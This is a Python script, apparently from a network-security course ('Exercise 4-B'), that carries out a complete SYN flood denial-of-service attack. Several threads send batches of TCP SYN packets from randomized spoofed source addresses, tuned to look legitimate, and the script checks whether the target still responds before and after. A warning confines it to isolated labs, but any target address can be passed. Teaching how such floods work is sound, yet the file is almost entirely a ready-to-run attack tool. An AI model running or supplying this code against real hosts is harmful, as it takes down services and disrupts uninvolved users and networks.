#!/usr/bin/env python3
"""
Module 4 — Exercise 4-B: SYN Flood

Sends TCP SYN packets with randomized spoofed source IPs to exhaust
the target's SYN backlog (half-open connection table).

Each SYN with a spoofed source causes the target to send SYN-ACK
to a nonexistent host, consume memory in the SYN_RECV table,
and wait for a retransmission timeout before releasing the entry.

WARNING: Use only in isolated lab environments. Flooding shared
infrastructure is illegal and will disrupt other services.

Monitor on target:
  watch -n1 'ss -s'
  watch -n1 'netstat -an | grep SYN_RECV | wc -l'

Usage:
  sudo python3 module4/syn_flood.py --target 192.168.56.2 --port 80
  sudo python3 module4/syn_flood.py --target 192.168.56.2 --port 80 --count 10000 --duration 30
"""

import argparse
import time
import threading

from scapy.all import IP, TCP, send, conf, RandIP, RandShort

conf.verb = 0
conf.iface = conf.route.route("192.168.56.0")[0]  # default to isolated lab NIC (not Vagrant NAT)

stop_event = threading.Event()
sent_count = 0
count_lock = threading.Lock()


def flood_worker(target: str, port: int, batch_size: int = 100):
    """Send SYN packets in a loop until stop_event is set."""
    global sent_count

    while not stop_event.is_set():
        # Build a batch of SYNs with randomized spoofed sources
        pkts = [
            IP(src=RandIP(), dst=target)
            / TCP(
                sport=RandShort(),
                dport=port,
                flags="S",
                seq=int(RandShort()),
                # Window size matching a real OS to look legitimate
                window=65535,
                # Basic TCP options to appear more like a real SYN
                options=[("MSS", 1460)],
            )
            for _ in range(batch_size)
        ]

        # send() at Layer 3 in a single call for efficiency
        send(pkts, verbose=False)

        with count_lock:
            sent_count += batch_size


def monitor(target: str, port: int, duration: int | None, max_count: int | None):
    """Print status and enforce stop conditions."""
    global sent_count
    start = time.time()

    while not stop_event.is_set():
        time.sleep(1)
        elapsed = time.time() - start

        with count_lock:
            current = sent_count

        pps = current / elapsed if elapsed > 0 else 0
        print(f"\r  [{elapsed:6.1f}s]  Sent: {current:8,}  ({pps:,.0f} pkt/s)", end="", flush=True)

        if duration and elapsed >= duration:
            print(f"\n[*] Duration limit reached ({duration}s)")
            stop_event.set()
        if max_count and current >= max_count:
            print(f"\n[*] Packet count limit reached ({max_count:,})")
            stop_event.set()


def check_target_responsive(target: str, port: int, timeout: float = 2.0) -> bool:
    """Send a SYN from our real IP and check if target responds at all."""
    from scapy.all import sr1
    reply = sr1(
        IP(dst=target) / TCP(dport=port, sport=12345, flags="S"),
        timeout=timeout, verbose=False,
    )
    return reply is not None


def main():
    parser = argparse.ArgumentParser(description="TCP SYN flood")
    parser.add_argument("--target",   required=True)
    parser.add_argument("--port",     type=int, default=80)
    parser.add_argument("--workers",  type=int, default=4,     help="Sender threads (default: 4)")
    parser.add_argument("--batch",    type=int, default=100,   help="Packets per send() call")
    parser.add_argument("--count",    type=int, default=0,     help="Stop after N packets (0=unlimited)")
    parser.add_argument("--duration", type=int, default=30,    help="Stop after N seconds (default: 30)")
    args = parser.parse_args()

    print(f"[*] SYN Flood")
    print(f"    Target:   {args.target}:{args.port}")
    print(f"    Workers:  {args.workers}")
    print(f"    Duration: {args.duration}s" if args.duration else "    Duration: unlimited")

    # Pre-flight: is target responding before flood?
    print("\n[*] Checking target responsiveness before flood...")
    before = check_target_responsive(args.target, args.port)
    print(f"    Target responsive before flood: {'YES' if before else 'NO (already down?)'}")

    print(f"\n[*] Starting flood... (Ctrl-C to stop)")
    print(f"    Monitor on target: watch -n1 'ss -s'\n")

    # Start flood workers
    workers = [
        threading.Thread(target=flood_worker, args=(args.target, args.port, args.batch), daemon=True)
        for _ in range(args.workers)
    ]
    for w in workers:
        w.start()

    # Start monitor (also handles stop conditions)
    try:
        monitor(
            args.target, args.port,
            duration=args.duration or None,
            max_count=args.count or None,
        )
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        stop_event.set()

    for w in workers:
        w.join(timeout=2)

    # Post-flight: did target recover?
    print("\n[*] Waiting 3s for target to recover...")
    time.sleep(3)
    after = check_target_responsive(args.target, args.port)
    print(f"[*] Target responsive after flood: {'YES' if after else 'NO (still saturated?)'}")
    print(f"[*] Total packets sent: {sent_count:,}")


if __name__ == "__main__":
    main()
